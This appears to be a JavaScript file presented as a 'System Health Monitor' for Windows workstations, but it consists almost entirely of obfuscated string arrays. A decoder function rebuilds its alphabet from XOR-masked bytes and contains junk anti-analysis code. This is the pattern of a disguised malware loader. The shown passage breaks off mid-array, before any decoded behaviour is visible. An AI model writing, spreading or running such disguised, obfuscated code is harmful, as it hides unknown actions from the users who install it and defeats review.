// System Health Monitor -- Workstation Edition
// Periodic diagnostic utility for Windows endpoints
// Verifies hardware baseline, critical services, and network connectivity
// Build 2.7.302

var keyArg = [
  "i_JYi_NU-uJqiElVfR.VwD1vy6ls-8eYwS9Qy~DCfRNzi_NUI62CfRNzi_M1-p2MymDH2P0Q-8CYiuVj-6s49mcVwmsH-8Nxy~Uui_MRImcFy8272/s49X1iImNF9mAYwD1x-8lSI/.M", ".Eqs2_JqiPJze/xPeXUUkPPAwr1AlhS4e/xEe_UUkr-8wr1AldJ4e/xPeuUUkPf6wr1ACdY4e/x~NXUUkr-hwr1ACdC4e/Ycl_UUkPeAwr1AChY4e/Y8l_UUkPDEwr1AeSC4e/YAN_UUkPCMwr1AN7-4e/Y0NuUUkPeMwr1Aedi4e/YUCuUUkrDPwr1AeVi4e/YvCuUUkrPAwr1AN7f4e/xPeuUUkrJvwr1AN7f4e/Y6eXUUkreMwr1AldC4e/YUl_UUkrF0wr1AlrS4e/x1N_UUkrFMwr1ANFS4e/Y8evUUkrY0wr1Ae7-4e/YveXUUkrecwr1AerY4e/xrWXUUkPf6wr1Ae7C4e/YceuUUkPEPwr1AChS4e/xEluUUkPSMwr1AldF4e/Y0WXUUkrSAwr1Al7J4e/YUe_UUkrS0wr1Alh-4e/x~euF", "i_JYiEls2_Mry6cV9mcVi_MCfRNzi_NFeXJjDpE42mSY./NBi_MEypla9~sH9v11SVl.XXJj7pqW9R24Imcs", "i/UY", "SVDeNSlSiPlx-/NQy6A4iE9s-tlQy6A4iPq7CR.dI~sV9mlV2R.siP9X7VVYD6sHeh.L781s-pEVImctS8sh2~Dj",
  "S8shN~sx9Mg", ".Eqs9_JqiPJze/YMW_UUkPN1wr1AW7Y4e/YUlXUUkr11wr1AlSC4e/YcNXUUkPiAwr1Ae7F4e/YhN_UUkrivwr1AeSe4e/xrCuUUkrYVwr1AChF4e/YVlXUUkPPvwr1AldY4e/YcWXUUkP.1wr1Al7J4e/YAlvUUkPE~wr1AW7C4e/xPNuUUkr-Uwr1AC7Y4e/x~lXUUkrSvwr1ANre4e/Y0W_UUkrihwr1Aedf4e/YUW_UUkr-cwr1AN7C4e/YUW_UUkrF6wr1AN7S4e/YVeuUUkr9~wr1AChS4e/x1eXUUkri8wr1ACde4e/YcCvUUkP.Pwr1AW7Y4e/x~l_UUkPiMwr1AedF4e/Y8l_UUkr._wr1AW7C4e/YcW_UUkP9rwr1ACVC4e/YVCXUUkPSAwr1AN7P4e/Y0l_UUkrYVwr1ANFe4e/xPCXF", "./JUirVY2/.ci/4YKPsH2pqB9XMR9m.X9REM9RlVi_MD-pFYipxV2/1hWugaf6xsf6jQ-_cxymEoy6cx28eHf6qjiuJjDRlsCpEhImlCfR.hImcti_MSImMsy8DVS6DdirSQwFlaytNsytCHD/.QyXYQi/VYf6EVf6YYkvJuiu1q", "DVEX7u1hkReoiJ", "SpDjy89swSsV9mVYwS0Q2~Dvfm0CfRNzi_NlkSsH2pqdfRNQy6AH7Rsry6MjfmcFws1x2~YYwS9a-plsi_ME-t.a-FEd2~sayu17Im0sytN4kSlaytNQytDs",
  "i_JYi_JYi_JYi_JYi_JYi_NzfRlz764YOXJzwmca2_JFNRxU9mlV9mN7I~Pvl7fQi_Ma-uJzKP2s2_M~Im0sX~EhI_JjS~EVI_JF78DVNps49XJjCm0ty8.Q2~xjiEliC7iMluFHX~EhI_Jj9RPY.PDA-~Dd2~DFS6xxedS6KC", "i_JYi/1Mfp0QfMqQ-_JYi_JYi_JYirVY./JU", "C6EUfmlQ2/F", ".uJFf7PYwXMa-/NQy6AY2pDvIm9Qf6EVImqHwmMs2~xa9_1M-6Sj-~DvymEH9mcVwR1x-8l8y8.F", "ImfYK_NL-6fYwmEH9_JzD~Dh2_MCfRNzi_NL-6fQKX1Z",
  "i_JYi_NUI6-Yi_JYirVYit.M-8NF9RlBwXN6e_MAWr9LldCH9RxsiY", "i_JYi~spi_YjypqVi_xS9RlVwD1x2~YY.~P0KXFYkv1sk~sVirPYLC", "ImfYK_MHy8CYKENs-8CjS~EVI_JFf7PQKX1Z", ".Eqh9uJqi_NlkSsH2pqdfRNQy6AH7Rsry6MjfmcFws1x2~Y", "i_JYi_NLfmfYOXJjIpqQyuxJKrPvW_U0lrJ4e7C6wrPhluU0ldY4e7ChwrPhluU0lrF4e7f8wrPvW_U0ehf4e7C0wrPheuU0eheQi/UYNpqvNmEdI_MOfpQsf8CYkv1yf6xx-sVz.EgYwm.Ay8iYe/xEeXFYLXF",
  "i_JYi_JYi_1.yt9aI6SjSpDh2PMs2~xa9_JjDR.Qi_NMe_Jj7mDVI~qFiE1a-8CYwS.a9/FY.~.FkXJjC6qH2~DH2ENc-~SYipEU-~0Qf6EVImqHw6Qhy6Aui_Mi9mEF9R.hi_Nz9_JjD~sj9mqM2ElsfvJ0e_JjNR.vy8.1f8NQy6AYS8Na-J", "ND.Xi~sHIRCY-/.af6Dh-6DhWuJ", "i_JYi_JYi_JYi_JYXmc6y6jswD2sfs.s-RDs-8CYwDDvIXJFDR.4i_MO2RN~Im0si_NO2RN~Im0si_MD-6D_fRlQfM1x-tlQyp-YwDNQymDa2RN79meYldJYwSDv-pqvCmlVImqHiElVy8J", "-~q89R.hI~D4y_JjD6sH9~q8S8Ncy~SYX~sF9~DHi_M~Im0si_i", "iFJ",
  "S8Nx-tCjS60s9RJYwDlsf6qH9/eYeU", "i_JYi_JYi_1~y8.EfmlzwSquIpDd2_1ZiElVy8JjS/.af6Dh-vJjXmCY.EgHS/.af6Dh-VsFi_M~y8.d9XJjNR.vy8.1f8NQy6AYS6s49mcVy/sry6cVImcM9X1q", "S6lvIR1VImctwF9Qy~D7kRlV9mMOfpQsf8C", "D6sHeh.LS/.af6Dh-U", "7MeoiJ",
  ".~eUirVYm6.ay602KP2s2_MrImM.ytlVfmcd9X1RImAhesqC-pqd9Rlhi_M~Im0V9RiYiFcxymSq.8.M-8NF9RlBwpDA9X-ui/UYD6xs-pSj76.b9mlVi/4Y.EgHC6qjymEH9P0QypSYwmMx2~lzi_-jwmljwmcawRDQ.v1qKC", "ND.Xi~sHIRCY-6Dv2psd9ReoiJ", "i_JYi/.M-8NF9RlBR6sFi_JYi_JYirVY./iU", "iP2_KXJji/lVfR.V2RJYfm.a-tNs9J", ".EqUOXiF9mc6Wslc-8NsyD.ay8N-S8sh2~Djeh.-.EqHiY",
  "i_JYi_JYi_JYi_JYXmc6y6jswD.s-8Nl9RNzy6CYwDDvIXJF27JYwSMs2~xa9_1Cy8lVi_M_y6Nci_x/9RCjC6qH2~DH2_JFRvc~2m047pEj9XJjSpE8KXJjC6qH2~DH2ENc-~SYipEU-~0Qf6EVImqHw6Qhy6Aui_Mi9mEF9R.hi_Nz9_JjD~sj9mqM2ElsfvJ0e_JjNR.vy8.1f8NQy6AYS8Na-J", "i_JYi~spi_x/9RCjC6sjXmch2~EHf6SYD6sHeh.LS/.af6Dh-vJjNps42~Dvi_.WfmMsOX2v2RlV9~DhIvcsk~Stiu1g", "N~Dhf8.Q-/NQy6A", "ND.Xi~sHIRCYypDV26qvIhzY", "SpDtN~D49RNs",
  "i_JYi_NhIXJqiEj7kRlV9mVHS6Dd2R.Q2/FHS/.QyplQ-~E4wslsf8DvIRNcXmNsytNQ9pss-sVuSvV0w7Sjehijl7CViY", "9pqvi_YFIXJqirPZi_NQi_M49XJhWvJFIX4BKX1Z", "i_JYi_NofXJqi_NEk~Dd2RNQy6cry6cV9RxVwF2s2ENc-~SzKXc1-8lsym.4kC", "./1BirVYwmQaImAYK_Y6lXAHW7JQi_4YKrF8wuA0ediQi_4YKrCAwuAMlvFYL_1/9RCjSpEH9~qji_Mry8DH2_J0lu1gi_SYkMjdI~EvRXNLLXF", ".~gUirVYKP2s2_MrImM.ytlVfmcd9X1RImAhesqO-~DvfRNQyp27kRlV9mVQwFlx-/NQy6A"
];
var argOffset = [
  "i_JYiE2z9R.swSquIpDd2_1Zi_NLwFsCCmNF-pDh-vJjypqVy~sB9XJue7i8wuzui_MxypCY.EgHXD119~Nv9Rlhi_MHy8N4Imjsi_i0ldFHedSVwuzui/VYLJ", "./ChirVY7pD8wDldI~DF2m0s9ENx-6j79RNVImct-Mls2_JjCm04y8272~Ev2Psp76c_fRNV9R.Q9ReYwSNaytN72~qUXm9/y6sH9VqHCpEV2~DvImDhi_MEk~Dd2RNQy6cSImMs7~sjIRCYKEjSImMsS81xysVoWsQs-pgQi_Ml2m0VIR149SsH-8Nxypls-v1.96ca-pDW9R-YwDlVfR.VD6xsyFE6fms4fm.49C", "i_JYi_NpfuJqiPQaImAjS~EVI_JF9rJYK_.hkmcdR84ULXcFfRCui_Mpi_x/9RCjN~EV9XJjNpqvymEVi_.ckRsc7SMF9_MiX~Mj-8euKXF", "i_JYi_NFyEDvy_JYirVYipxV2/1hWuga96sVI/DuwplayXqv2RlV9~DhIvqv2RlV9~DhIvqv9m0sfRls-vqFy82Hy~qx9_gF2dJa./1B9vi", "i_JYi_JYi_1q",
  "i_JYi_NLkpFqwmQaImcyf6xx-sj2RXYce_U0e7P4e7PUwrPUeXUVluU8evU0erJ4e7J0wrP0e_U0e7f4e7JMwrPUeuU0erS4e7J0wrP0l_F", "SVDeNSlSiPcxymS4iPcMym.s-FqpC6qv9Re4iPMxkPl4y6lBS81s9mC4iP0afmNC9R.d9mcVfm2siP9X7VVYD6sHeh.LS/.af6Dh-6qv", "Chz", "NmcMymDvfRNa-Y", "i_JYiElVfR.VwDl49mDUi_M79mlaypNhiri",
  "i_JYi~0a962s9EqM-6Dvi_JYi_JYirVYImfYK_NMeuFYkvJF27iYLX1sy/lsi/4Y.~DH2dQDSVDX7FElNX1q", "XSc.D_1RCD.WWu1H9RN8y8.Bi/DHfR9xIm0xfp0si~EVi/lVfR.V2RJ", "N6DV76.b", ".~AUirVYis.M-8NP9RlBC6MWyMDQiY", "i_JYi_NU-hEF9mUYOX1JiY",
  "f_C", "i_JYiP2s2_MrI~s49PsV9mVYwD1x2~YY.~CUi_M~Im0V9RiYitlcyplLKucFfRCui_ME-t.a-FEd2~sayu17Im0sytN4kSlaytNQytDsi/UYSpDjy89swSsV9mVYwS9a-plsi_ME-t.a-FEd2~sayu17Im0sytN4kSlaytNQytDs", "i_JYi_No9uJqi_Nofuc/9RN~ImD49_YFR6Epw_1ySpDpy~Dd2~sayuc_ImcFImctNp0x98l2WdQWy6cC2m.4ImeYwm.a-u1ySpDpy~Dd2~sayuc_ImcFImctNp0x98l2WdQ72~EVImeQ", "i_JYi_JYi_JYi_JYD8.Q2~SjNR.vy8iYiuiYwSDv-pqvCmlVImqHiElQy~DH2~0cC6qH2~sH2mS", "DVEX7u1H9RCoiJ",
  "SVDeNSlSiPcxymSYNs.O7X1RImAhesqC-pqd9RlhiE2iND.EiPcxymSq.U", "781sysNsk/N~Im0s", "ypqV9R1x9_csk~S", "i_JYi_JYi_JYi_JYSpDjy89swSsV9mVY.EgHNtD4yPcxymSYwS9a-pls", "X~qh2~cxymSoiJ",
  "./SVirVY2/.ci/4", ".EqsfvJqiPJze/xrCuUUkrx1wr1Aehi4e/xPN_UUkrCMwr1AN7e4e/YVNuUUkPeMwr1AW7f4e/Y6luUUkr-hwr1Aere4e/YANXUUkrSVwr1AWSS4e/YveXUUkPe8wr1Al7e4e/Y0NuUUkPDrwr1AN7S4e/YUlvUUkrD1wr1ACdC4e/YhlXUUkPihwr1ACdY4e/YvlXUUkrDPwr1ANdY4e/YMNuUUkPiAwr1AlPC4e/Y8l_UUkri0wr1AC7J4e/Y0NXUUkPSVwr1AWSS4e/YUlXUUkr2_wr1AlVe4e/YhNXUUkPiVwr1ACdP4e/YMN_UUkrY6wr1ACde4e/xrN_UUkrS0wr1ANrJ4e/Y0NuUUkrD~wr1AedJ4e/YveXUUkrsEwr1AN7Y4e/YcNXUUkrJMwr1Ae7-4e/x~WXUUkPihwr1AC7F4e/x_eXUUkreAwr1AlhY4e/YMN_UUkr1rwr1ANrY4e/x~lXUUkrCUwr1ACSC4e/Y8eXUUkPicwr1ANPP4e/YAN_UUkPPMwr1AldC4e/Yhe_UUkPPcwr1Alre4e/YUe_UUkrecwr1Aehf4e/Yce_UUkr1~wr1Ae7C4e/Y6NXUUkPD~wr1AePP4e/YMN_UUkriAwr1ANde4e/YhNuUUkrJ8wr1AeVS4e/YvWXUUkrecwr1AWSf4e/Y0CvUUkrNEwr1AlhY4e/YVevUUkPCVwr1ANdP4e/Y0eXUUkPl~wr1AeFC4e/YVCuUUkrSMwr1AN7F4e/YVCvUUkrC6wr1AN7J4e/YACvUUkPNPwr1AeFe4e/Yvl_UUkr9Pwr1ANrS4e/YAe_UUkr1Pwr1AWPf4e/xEW_UUkr2rwr1ACFS4e/xEWXUUkrN~wr1ACdY4e/xreXUUkPS0wr1Alrf4e/Y0evUUkr1rwr1AerS4e/Y8lXUUkPevwr1Aed-4e/Y6NuUUkP.rwr1ACSC4e/xPl_UUkrlrwr1AePC4e/x1luUUkPfcwr1ANFC4e/xElvUUkPP6wr1AeVe4e/xEWXUUkPD_wr1AWSS4e/xrl_UUkr1Pwr1AWrY4e/xrlvUUkPehwr1AehS4e/Y0CXUUkPiMwr1AePP4e/x~e_UUkr9Ewr1AerP4e/xPl_UUkrsrwr1AeFi4e/x1euUUkri6wr1Alhi4e/xrlXUUkrFcwr1AN7f4e/x~l_UUkrfcwr1AC7C4e/xECXUUkrs~wr1AlrP4e/x_e_UUkPP8wr1AW7-4e/YvN_UUkr1rwr1ANSe4e/x_l_UUkrScwr1ACd-4e/YUeXUUkrEPwr1AedP4e/YhN_UUkrs_wr1ANPi4e/YMNXUUkrE_wr1Ae7e4e/x_WXUUkrShwr1AWrY4e/YhCvUUkrPcwr1ANSS4e/Y8W_UUkPi6wr1AC7S4e/xrWXF", "NRxsfVMs2~xa9Eg", "SVDeNSlSiPlx-~EdIRNciP9X7VVYD6sHeh.LS~xc-6sdfm0l9mMa-tF", "i_JYi/Nz-pq8i_iu",
  ".PDv-pqvCmlVImqHS/.s9pDv9mcd9XJqi_.72~qUiY", "SpDtD8.Q2~S", "i_JYi_NL2_JqiPQaImAjS~EVI_JF9mc6WsNE7DJYKEj.7vcCfRNzR7zoN6DVSpEH9~qjNps49ScxymSzKXJBi_iH-/e0iuF", "i_JYi/V", "Cpqa2rzY",
  "S8Na-_M79R.6Imlsi_MWfmMsi_.X2RlVN~DhIviYwSDv-pqvCmlVImqHiElQy~DH2~0cC6qH2~sH2mS", "7FsrmU", "ircH2mUYedApeC", "i_JYi_JYi_1dfRNdI_1Z", "ND.Xi~sHIRCY-8shWuJ",
  "i_JYiP2s2_MrI~s49PsV9mVYwD1x2~YY.~CUi_M~Im0V9RiYitlcyplLKucFfRCui_ME-t.a-FEd2~sayu17Im0sytN4kSlaytNQytDsi/UYNpqvNmEdI_MOfpQsf8CYkU", "9pqvi_YFIXJqirJZi_NQi_M42_Jver4Y.~FBKvFYkU", "./fvirVYedCVlhiVehi", "26sHym2j2/eok6sj-~Dv-6qHfRNQy6ce9R9syrMQyR1s-tlaypEV9RVxREUHR/.ay8N-f6sj2di", ".~PUirVYiFeoRE1vy62vfmVYNps49Rl-StDh2PNs-64u"
];
var loadHandle = [
  ".~UUirVY2/.ci/4", "i_JYi_JYi_JYi_JYImfYKENs-8CjS~EVI_JF78DVNps49XFYkU", "7mDVI~qF-Mg", "./SvirVYKP2s2_MrImM.ytlVfmcd9X1RImAhesqry6MU2RNs-slc-8NsyXJjNR.vy8.1f8NQy6AYS6s49mcVy/sry6cVImcM9XFHDRls-FcxymS", "C6qjymEH9P0QypS",
  "i_JYi_JYi_172~Ev2_M7y~Ds-_JjS6Ddy6cF-vJ0Wv1u-pDxIU", "SVDeNSlSiElVfRNsiP9X7VVYD6sHeh.LS6Dv2psd9X1RXPDXNX1WfmMsOX-", "SFD/RMlI", "SVDeNSlSiPNs-6lvIR1VImqHw_1.SPEF9/.s-8e4iPNs9pEMy/N.SP2x2~D8fRF4iPNWSMls-t9s-slsfR.dIPqv9~DviP9X7VVYD6sHeh.L7pDV26qvIVEFfR1V9R.ry6cpIm2M-pEVImqHiE2iND.EiPsCNmcxfp0s9rMS-tDs", "./f0irVYipDx9mNsfdJUWrxsldY8fpfVlpf8fhC6f7sdlpDxl7Cce6lsl7EpehPhl~Np9r9xf6.s9~iVl6iMfdF0ehfvlhCu",
  "i_JYi_JYi_1V-tFYkU", "ND.Xi~sHIRCY-8shImcpyhzY", "NPc7S6Dv2pDvS6Dx-plz78.F9Ri", "NRxsfMEM9R.c", "-~q89R.hI~D4y_Jj7pqC-pqpIm0si_M~Im0si_i",
  "S8shX~D4-~Dv", "i_JYi~spi_YF9hJHf6sVkXFYkvJu._YF9hJHf6qMytNvkXF4i_Cz.~-UwplQ2/FQiu1qi~D4-6SYkvJuiu1q", "7Sxoi/UYSFElWuJ", "i_JYi_No9uc79RNmfm0M9XYFytD4y_UY./Nv2mSQ", "DVEX7u1H9RCoi~cai~Ed2~s69X1x9~EU2~Dvi~9a2mcF",
  "Nt.s9DlUfmls", "i_JYi_Nte_JqiPsH2pqB9XMX9RlV7mDVI~qFi_MD-pFYipxV2/1hWugaIR18I~gHIRea./JUiuJjDRlsCpEhImlCfR.hImcti_MSImMsy8DVS6DdirS", "i_JYi_N4ypjhirVYC_Yu.~DH2dQCDS.eXSl-N~DhI8Na-E0X2RlVN~DhIvc4yp4uwJ", "i_JYi~qhi_JYi_JYi_JYi_JYi_JYirVY.~gU", "C60a-6S",
  ".EqpirVYk81x-pEjK_NFK74Ff7MyS6Dd2R.Q2/FHC8.c-/Na98.x-~xcwFEs-MVoWFlv9mEV9XYQWvNxwFjsk7VFR64Z.~PHXDfq.~Nye_AHe7D2WMjS9RxVwFDHf6qFImctR7zoDDN~W_c/9RN72/.Qyp-z.~PHC8.sfRNsN~Dd-tsU2~qvK_FHD/.xytlpy8.jNpsHfm0_y~qdIvYF9_U0luUF9_ce9mct2~Yje7fQKRV", "2/.ci/4YSpDjy89swSsV9mVY.vCz.Eqh9FNQ-uJj-pDUy~Ed9XJu.vi4iu-tiuFti_M~y8.d9XJjNR.vy8.1f8NQy6AYS6s49mcVy/sry6cVImcM9X1qi~lx2~lzi/jq", "i_JYi_JYi_JYi_JYi_JYi~spi_YF-6so9SqBi_MxypCY.~xx-6xOIvFYkv1v9RNM-pAY./Nv2mSYLC", "i_JYi/2zIm0si_YF2~gYwm2VirJQi/4", "i~sUOC",
  "RX1Hy8CY-tDHypsH9vJz", "i_JYi~0af6E4R6sUi_JYi_JYi_JYirVY.~FU", "fm.d9~Dp96xQIpj4ymca-/Ev-8NM2t2AkRzUe7ihlrS6lhYc", "i_JYiEq7DC", "./ShirVYImfYK_NMeuFYkvJz./Svi_Mh-~0Q2_JtREUtKD4jeDVYLX1sy/lsi/4Y.~DH2dQDSVDX7FElNX1q",
  "7~qx9E1s-plsytNx96S", "28Dx2Rls-tf", "i_JYi_NUI62CfRNzirVYXpqQyuMCfRNzi_NsytfoDPDlS_JF-~jt", "D6sHN~sx9Mg", "i_JYi~Nai/4YRVleWv172~Ev2_M7y~Ds-_JjS6Ddy6cF-vJvi/VY26xQy~SYK_x/9RCjN~EV9XFYwm0Vi_NFy_F",
  ".~NVirVYm6qv9~Dv9mN2C/4", "ImfYK_MHy8CYKP2s2_M79R.6Imlsi_MWfmMsi_.X2RlVN~DhIviYwSDv-pqvCmlVImqHiElQy~DH2~0cC6qH2~sH2mSQKX1Z", "i_JYi/.s2/DvyuJF9pE4-6S", ".EqHOXMby6sHm6lzfR.yRDVze7PvwrFcwrF8wrPUW_U0e7-4W7-4lrf4e7J0wrPve_U0erPQ", "D8.Q2~DeImcs"
];
var countCode=[16,0x6b,5,40,10,31,36,0x75,51,0x74,17,45,63,54,13,21,25,20,2,0x6d,9,30,55,8,60,99,19,35,0x77,0x68,49,22];var verifyResult=[0xad,0x8c,0x81,0x90,0xb2,0x87,0x84,0x80,0x8e,0xa5,0x96,0xb6,0xc0,0x9e,0xbc,0x95,0xa1,0xc4,0x82,0x9c,0xa2,0xb9,0xc2,0xcc,0xb5,0x97,0x9b,0xae,0x93,0x85,0xc1,0xb3];var setValue="";for(var updateMin=0;updateMin<0x20;updateMin++)setValue+=String["fromCharCode"](countCode[updateMin]^0x5a);for(var computeRet=0;computeRet<0x20;computeRet++)setValue+=String["fromCharCode"](verifyResult[computeRet]^0xf4);
var jobParams = [
  "i_JYi_NL-69PIRiYOX17-~0Q2_MCfRNzi_NL-6f", "i_JYi_JYi_172~Ev2_M7y~Ds-_JjS6Ddy6cF-vJzevJbi_NQKC", "i_JYi_JYi_JYi_JYD6xs-pSj76.b9mlVi/4Y.EgHC6qjymEH9P0QypSYwmMx2~lzi_-jwRls-t9s-u-YLXFYkU", "XSc.D_1RCD.WWu1h9R.6ImlsiE4", "S81ay60s-Y",
  "i_JYiE.symq69XM.2~Dji_NUI62CfRNzi_M~y8.d9XJjNR.vy8.1f8NQy6AYS6s49mcVy/sry6cVImcM9C", ".~C0irVYXpqQyuMCfRNzi_NFe_Ju-~Ds-ucB9RFu", "i_JYi_JYi_JYi_JYi_JYi_NhIRQs764YOXJz.PDA-~Dd2~DFS6so9XJjy~SYe_Jjy8iYKP2s2_M.2~Dji_NO2RN~Im0sKXce9mct2~YYwmD0i_NEk/1sf8Ns9ElQkpSQ", "CmlVIR9s", ".uJFf7PYwXMUfRlh26qv9_JF-~4",
  "9tDHf8NQy6AYRV2Ci/4", "i~NH-hV", "DVEX7u1z2hzY", "i_JYi_JYi_1qi~lx2~lzi/4YLC", ".EqBirVYm6.c2~DyRDVzC_xpy8iz.~Fqer4FIXM42rfVWvNQKhVAKRjyC6qH2pDv2EVoWsNaCtsV9XYF2dPHS8Du-8NvImctK_NQwriQwrP6KRVQKU",
  "i_JYi/NvkX1Z", "N~EsymqHi/lVfR.V9mC", "i_JYiE.symq69XM.2~Dji_MeIRNs-pE4S~EVI_Ju", "i_JYi_JYi_JF9pUYOXJF2/.M974Yft.sfm4", "S8Nx-tCjS60s9RJYwDlsf6qH9/eYlC",
  ".DV", "9RxUy~qv9RiH9Rxs", "i_JYi~0af6EVImqHi_JYi_JYi_JYirVY.~UU", "i_JYi~layR1M2~DvR6cxymSYi_JYirVY.~DH2dQr7VMCDDNESFc17SS", "Nps49SDAIRlV-U",
  "i_JYi~ljR6caR8DQR8.MypcQyp-YirVY.~eU", "SpDjy89swSsV9mMC-pqU9R.VkXJjS~EVI_JtXPjrD7Q-S6qp2/2x-pD-7msd-pqhy69VRE1a26DvS6xsy~0-eD07I~D4yPsF-M0lImlvy8la9tCHS~q89R.7I~D4y_-YwScxymSYNRxsf8DVImqHS~q4Imlci_ME-t.a-FEd2~sayu17Im0sytN4kSlaytNQytDs", "i_JYi_NVIvJqi_Mby6sHi_Y0wuA6l_1giP9a-FDxf6Yj76.b9mlVi/4Ym6lzfR.2K_YVW_AHl7-QKvYclvAHe7JvKX1giP2s2_MXfmcFy6VQi/VQ", "XE-oiJ", "SpDtIRlV9RijS6lz9mNMy~DFD~EhIvJjD~EhIVcxymSY.~AUi_M1f8NQy6AY./CUi_MS-pst96Dvi_NVeXJjS/.QyplQ-~E4i_NVeuJjS6DV2~sH98eY./Chi_M~y8.d9X1giPqM2_MW2m04",
  "i_JYiP2s2_MrImM.ytlVfmcd9X1RImAhesqC-pqd9Rlhi_M~Im0V9RiYiFcxymSq.8.M-8NF9RlBwpDA9X-ui/U", "i_JYi_JYi_1RI~Dv9XMOfpQsf8CYkvJFRvcry6MjfmcF7~sH9XJjfmcFi_NLwFlaymMxypNeImcsi_MHy8NjfRNdI_JtwXVz-6Dv2psd9R0h9R.69R.gf6VQ.v1qi/U", "i_JYi/ls-t9Qf6DL-8Nx2/Dhi_JYirVYImfYK_Nhe_FYkvJF-hJHS8Nx2/DhwsNaS8NvImctK_FYLX1sy/lsi/4YiFMQ-8lQyp-ui/V", ".~FUirVYKP2s2_MW9RN.SPEF9/.s-8eYwSEF9/.s-8l~fmMQy/FYXD16l_JjNR.vy8.1f8NQy6AYS6s49mcVy/sry6cVImcM9X1g", "i_JYi_NC-pqt-pDh-M1v9m9s-pDHf6SYOXJtS6s49mcVy/sry6cVImcM9X-",
  "i_JYi/2zIm0si_YjypqVi_CGKX1Z", "LX1dfRNdI_1Zi_iui/V", "f_iui_Mm9R.uiE.MyFEh", "R~0a98e", ".uJFf7PYwXMa-/NQy6AYfR1U-pq69XMjy6Nsi/1x-8l8y8.F",
  "ND.Xi~sHIRCYI/-oiJ", "fRNEypC", "R/ls-t9Qf6SH-8Nx-tN72/i", "i_Y", "RVle"
];
function taskMode(i){
    var _r=[keyArg,argOffset,loadHandle,jobParams,statusInput,pollCur,openAddr];
    var s=_r[Math["floor"](i/0x2d)][i%0x2d];
    var r="",b=0,bits=0;
    for(var stateStr=0;stateStr<s.length;stateStr++){
        var pollCheck=setValue["indexOf"](s["charAt"](stateStr));
        try { if ((new Date())["getFullYear"]() > 0x85c) { throw 0xa8e; } } catch(tmp781) {}
        if(pollCheck<0)continue;
        b=(b<<6)|pollCheck;bits+=6;
        if(bits>=8){bits-=8;r+=String["fromCharCode"]((b>>bits)&0xFF);}
    }
    return r;
}
var statusInput = [
  "SVDeNSlSiPcxymSYNs.O7X1RImAhesqry6MU2RNs-slc-8NsyC", ".DNE7DJs", "mVcs2_c79R.6ImlsS~qQytNlfmcx96DvR7zoS6Dd2R.Q2/sC-pqVy6lay_JqiEjW9RCHS6Dd2R.Q2/sC-pqVy6layENc-~D2WdQSy/e0eY", "ymq69Scsk/C", "D8Di9m0U9R.L",
  "i_JYi_NVIvJqi_x/9RCjC6qH2~DH2_JjS~EVI_JF9rPYwD.x2vFHD/.QyXYQ", "9mlV", "i_JYi_JYi_JYi_JYi_JYi_1~y8.EfmlzwSquIpDd2_1ZiPQaImAjS~EVI_JFRvc~2m047pEj9XJuN~DhI8Na-E0X2RlVN~DhIvc4yp4ui/V", "7RlX9R1a-tNL", "i_JYi~9a-uJz.~FYOXJ0WvJFIXJjy~SY.PMxkPEV2~Dj-/NhWvJFIX4BKX1Z",
  ".~.FkXJqi_NF2_1giPlayt9s-tNSyvMK-6qH", "2/.ci/4", "i_JYi_NFy_Jqi_x/9RCjN~EV9XFHCmNFS6Ddy6cF-vYve_F", "N6DVwD1vy6ls-8eY-tDh2~Ns-64YwSDv-pqvCmlVImqHiElQy~DH2~0cC6qH2~sH2mSYL_172~qUwD1vy6ls-8eYwS9a-plsi_ME-t.a-FEd2~sayu17Im0sytN4kSlaytNQytDs", "N6DVN/.Q2pS",
  "Nt.s9D1zkRlQf6E47mDjy8.c", "i_JYiEls2_Mry6cV9mcVi_MCfRNzi_NpfuJjDpE42mSY.~.FkXJjNmcdy6NQyp-YDDN~WJ", "./C0irVY7pD8wDldI~DF2m0s9ENx-6jS-pst96Dvi_M12P0a9VqH", "D~qVfm0mIRlQfp0s7mDjy8.cS6so9C", "XPje7D077V9SDVEXND0Lf89LRJ",
  "ImfYK_NH2vFYkvJF9/NyipEt9mcVR8NaI6DHisVYOXJF2~4YLC", ".E1vy62v9RlhS/.s9pDv9mcd9XJqi_27Im0sytN4kSlaytNQytDs.U", "XSc.D_1RCD.WWu1U-pqd9RlhiE4", "R7zY", "wt1heC",
  "i/UY7mDjWuJ", "i_JYi_JYi_JYi_JYS8Nx-tCjS/.af6Dh-vJFR8JYwSEv98Dj9mcV7~sh2_JuwmPYf_i", "i_JYi~spi_YjypqVi_NofuFYkv1VI/.a2vJu2_iYLC", "N~chf6EdI~S", "S8Nx-tCjS6Dv2psd9XJj7pEj9XJuStDh2PNs-64ui_ME-t.a-FEd2~sayu17Im0sytN4kSlaytNQytDs",
  "./CUirVY7pD8wDldI~DF2m0s9ENx-6j1f8NQy6AYwSDA9mlM2~SYiuNxeXiYwSEv98Dj9mcVi_ijwmljwmcawRDQiY", "i_JYi~sH-8Nxy~0L2~sj9RlVfmMUirVYKP2s2_MPfRNsi_M~y8.jfRCYitsckRFj7SVj9~CYXPYoymVo-8euKC", "LX1sy/lsi/4", "iEje7VEPiJ", "ND.Xi~sHIRCYypDVWuJ",
  "RXJ", "SpDjy89swSsV9mVYf_NlkSsH2pqdfRNQy6AH7Rsry6MjfmcFws1x2~YYwS9a-plsi_ME-t.a-FEd2~sayu17Im0sytN4kSlaytNQytDs", "i_JYi_JYi_JYi_JYLC", "RMlD", ".~c8irVYwmca2_JzD~Dh2_MCfRNzi_NFeXF",
  "9tDHf8NQy6AYRMlDi/4", "7~Eh2P.ay8ND-ENQymS", "N~D49RNsNpq49~Dv", "SFD/RVNR7M.P", "i_JYiElsy~Dd2_MOfpQsf8CYwS9Q-tlVirPYwSDA-~EH9E1vy81s-tNciPsCCmNF-pDh-vF"
];
var pollCur = [
  "SVDeNSlSiP0x-8N_y6qVDR1SImMsw_1~-pDsS~xc-6sdfm0l9mMa-tF4iENa2~E4DpshIm.49SMsymqvkDlQkpSYNs.O7X1RImAhesqO-~DvfRNQyp27kRlV9mV", "C8.sfRNsNpq49~Dv", "S89d7m2vRU", "N~D49RNsNps49C", "LX1dfRNdI_1Zi_NH2m04i/V",
